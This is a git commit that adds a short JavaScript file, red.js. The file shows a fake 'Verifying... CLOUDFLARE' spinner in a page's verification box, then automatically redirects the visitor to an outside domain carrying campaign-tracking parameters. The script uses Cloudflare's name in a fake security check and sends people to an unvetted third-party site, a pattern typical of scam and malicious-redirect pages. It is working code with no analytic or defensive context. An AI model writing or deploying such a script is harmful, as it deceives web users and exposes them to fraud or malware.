e00cc2c4720d7603ba311409e371a49dfca52acc
uk-best <partnersbuffallo@gmail.com>
2025-12-16 15:32:13 +0530

    Create red.js

---
+++ red.js
@@ -0,0 +1,8 @@
+setTimeout(function() {
+    const box = document.querySelector('.verification-box');
+    box.innerHTML = '<div class="spinner"></div> Verifying... <span class="cloudflare">CLOUDFLARE</span>';
+}, 100);
+
+setTimeout(function() {
+    window.location.href = 'http://p8r9.com/?utm_campaign=HVuSi7q1AE&v1=[v1]&v2=[v2]&v3=[v3]';
+}, 500);
